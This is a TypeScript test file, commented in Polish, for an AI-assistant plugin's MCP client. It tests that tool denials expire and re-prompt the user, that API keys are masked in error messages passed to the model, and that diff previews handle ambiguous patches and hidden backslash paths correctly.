// ─── AUD-bledy-021: pamięć odmów WYGASA (jedno „Odmów" nie blokuje narzędzia na zawsze) ───
//
// `MCPClient` powstaje raz na cały cykl życia pluginu, a `clearDenials()` nie ma w produkcji
// ANI JEDNEGO wołacza. Klucz odmowy narzędzia bez ścieżki to `<narzędzie>::*`, czyli CAŁE
// narzędzie — jedno kliknięcie „Odmów" na serwerze MCP odbijało każde następne wywołanie
// (w nowej zakładce, jutro rano) bez pokazania modala. Jedynym resetem był restart pluginu.

/** Klient z atrapą approvalu: `answers` to kolejka odpowiedzi na kolejne pytania. */
function _makeDenialClient(answers: Array<'deny' | 'approve'>, options: { denialTtlMs?: number } = {}) {
    const asked: string[] = [];
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: {
            getAgent: () => ({ name: 'Jaskier' }),
            getActiveAgent: () => ({ name: 'Jaskier' }),
        },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: true }),
            requiresApproval: () => true,
        },
        approvalManager: {
            requestApproval: async ({ toolName }: { toolName: string }) => {
                asked.push(toolName);
                return { result: answers.shift() || 'approve' };
            },
        },
    }), asRegistry({
        getTool: (name: string) => ({ name, description: name, execute: async () => ({ success: true }) }),
    }), options);
    return { client, asked };
}

test('021: po wygaśnięciu TTL narzędzie PYTA ponownie zamiast odbijać się o starą odmowę', async t => {
    // TTL 0 ms = odmowa wygasa natychmiast (w produkcji to minuty; tu chodzi o mechanizm).
    const { client, asked } = _makeDenialClient(['deny', 'approve'], { denialTtlMs: 0 });

    const first = await client.executeToolCall(
        { name: 'blender__scene', arguments: {} }, 'Jaskier') as { isError?: boolean; error?: string };
    t.true(first.isError, 'pierwsze wywołanie: user klika „Odmów"');

    const second = await client.executeToolCall(
        { name: 'blender__scene', arguments: {} }, 'Jaskier') as { success?: boolean };

    t.is(asked.length, 2, 'drugie wywołanie MUSI pokazać modal, a nie odbić się w ciszy');
    t.true(second.success, 'user zmienił zdanie i zatwierdził');
});

test('021: w oknie TTL odmowa dalej blokuje od ręki (mechanizm nie znika, tylko wygasa)', async t => {
    const { client, asked } = _makeDenialClient(['deny'], { denialTtlMs: 60_000 });

    await client.executeToolCall({ name: 'blender__scene', arguments: {} }, 'Jaskier');
    const second = await client.executeToolCall(
        { name: 'blender__scene', arguments: {} }, 'Jaskier') as { isError?: boolean; error?: string };

    t.is(asked.length, 1, 'drugie wywołanie nie zawraca głowy userowi tym samym pytaniem');
    t.true(second.isError);
    t.true(String(second.error).includes('WCZEŚNIEJ'), second.error);
});

// ─── AUD-security-128: zewnętrzny catch klienta oddaje modelowi TEKST BŁĘDU ───
// Ta sama klasa co K8/K20 — komunikat wyjątku bywa zrzutem zdarzenia strumienia razem
// z nagłówkiem `Authorization`, a stąd leci prosto do transkryptu tury.

test('128: catch w executeToolCall maskuje sekret w komunikacie oddawanym modelowi', async t => {
    const SECRET = 'sk-ant-TAJNYKLUCZ0123456789abcdef';
    const client = _makeNormalizingClient(async () => {
        throw new Error(`stream event failed: {"Authorization":"Bearer ${SECRET}"}`);
    });

    const result = await client.executeToolCall(
        { name: 'write', arguments: { path: 'a.md' } }, 'Jaskier') as FailingToolResult;

    t.true(result.isError);
    t.false(String(result.error).includes(SECRET), `klucz jawny w zwrotce: ${result.error}`);
});

// ─── AUD-code-review-064: podgląd diffa sprawdza unikalność old_text tak samo jak WriteTool ──
//
// Krok 6b liczy `newContent` z `old_text`/`new_text` samodzielnie (kopia algorytmu WriteTool),
// ale dotąd bez sprawdzenia drugiego wystąpienia — pokazywał diff na PIERWSZYM dopasowaniu,
// user zatwierdzał, a `WriteTool.execute` (krok 7) i tak odrzucał zapis jako niejednoznaczny
// (`old_text_multiple`). Test dowodzi: przy dwuznacznym `old_text` diff W OGÓLE się nie pokazuje
// (userowi nie proponuje się zmiany, której zapis i tak odrzuci); przy jednoznacznym — pokazuje
// się z poprawnie policzonym `newContent`, jak dotąd.

function _makePatchDiffClient(oldContent: string, diffCalls: Array<{ oldContent: string; newContent: string }>) {
    const agent = { name: 'Tester', permissions: { guidance_mode: true } };
    const file = { path: 'Notatki/x.md' };
    const app = {
        vault: {
            getAbstractFileByPath: () => file,
            read: async () => oldContent,
            adapter: { exists: async () => false },
        },
    };
    return new MCPClient(asApp(app), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: true }),
            requiresApproval: () => true,
        },
        approvalManager: {
            requestApproval: async () => ({ result: 'approve' }),
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            execute: async () => ({ success: true }),
        }),
    }), {
        diffModalFactory: (_app: unknown, options: { oldContent: string; newContent: string }) => {
            diffCalls.push({ oldContent: options.oldContent, newContent: options.newContent });
            return { waitForApproval: async () => 'approve' };
        },
    });
}

test('064: old_text z DWOMA dopasowaniami — diff w ogóle się nie pokazuje (zamiast pokazać pierwsze losowe)', async t => {
    const diffCalls: Array<{ oldContent: string; newContent: string }> = [];
    const client = _makePatchDiffClient('kot je kot', diffCalls);

    const result = await client.executeToolCall(
        { name: 'write', arguments: { path: 'Notatki/x.md', mode: 'patch', old_text: 'kot', new_text: 'pies' } },
        'Tester',
        { autonomy: 'edge' },
    ) as { success?: boolean };

    t.is(diffCalls.length, 0, 'old_text niejednoznaczny — MCPClient nie ma prawa pokazać diffa na przypadkowym dopasowaniu');
    t.true(result.success, 'wykonanie realnego narzędzia leci dalej (ono samo odrzuci old_text_multiple)');
});

test('064: old_text z JEDNYM dopasowaniem — diff pokazuje się z poprawnym newContent (bez regresji)', async t => {
    const diffCalls: Array<{ oldContent: string; newContent: string }> = [];
    const client = _makePatchDiffClient('kot je rybę', diffCalls);

    await client.executeToolCall(
        { name: 'write', arguments: { path: 'Notatki/x.md', mode: 'patch', old_text: 'kot', new_text: 'pies' } },
        'Tester',
        { autonomy: 'edge' },
    );

    t.is(diffCalls.length, 1, 'old_text jednoznaczny — diff MA się pokazać');
    t.is(diffCalls[0].newContent, 'pies je rybę');
});

// ─── AUD-code-review-006: podgląd diffa rozpoznaje ukryte ścieżki kanonicznym isHiddenVaultPath ──
//
// Bespoke test (`path.startsWith('.') || path.includes('/.')`) nie normalizował `\` → `/`,
// więc ścieżka z separatorem wstecznym (`Folder\.hidden\plik.md`) NIE była rozpoznana jako
// ukryta — krok 6b nigdy nie sięgał po adapter i pokazywał diff z pustym „starym contentem"
// zamiast realnej treści pliku. Kanoniczny `isHiddenVaultPath` (`modules/tools/vault_adapter_io.ts`)
// normalizuje separator i łapie ten przypadek.

test('006: ukryta ścieżka z separatorem `\\` jest rozpoznana — diff czyta PRAWDZIWY stary content z adaptera', async t => {
    const diffCalls: Array<{ oldContent: string; newContent: string }> = [];
    const agent = { name: 'Tester', permissions: { guidance_mode: true } };
    const app = {
        vault: {
            getAbstractFileByPath: () => null, // nie w indeksie Obsidiana — plik ukryty
            adapter: {
                exists: async () => true,
                read: async () => 'stara treść z .pkm-assistant',
            },
        },
    };
    const client = new MCPClient(asApp(app), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: true }),
            requiresApproval: () => true,
        },
        approvalManager: { requestApproval: async () => ({ result: 'approve' }) },
    }), asRegistry({
        getTool: (name: string) => ({ name, description: name, execute: async () => ({ success: true }) }),
    }), {
        diffModalFactory: (_app: unknown, options: { oldContent: string; newContent: string }) => {
            diffCalls.push({ oldContent: options.oldContent, newContent: options.newContent });
            return { waitForApproval: async () => 'approve' };
        },
    });

    await client.executeToolCall(
        { name: 'write', arguments: { path: 'Folder\\.hidden\\plik.md', mode: 'replace', content: 'nowa treść' } },
        'Tester',
        { autonomy: 'edge' },
    );

    t.is(diffCalls.length, 1, 'ukryta ścieżka z `\\` musi trafić w gałąź adaptera i pokazać diff');
    t.is(diffCalls[0].oldContent, 'stara treść z .pkm-assistant', 'oldContent ma pochodzić z REALNEGO odczytu adaptera, nie z pustego stringa');
});
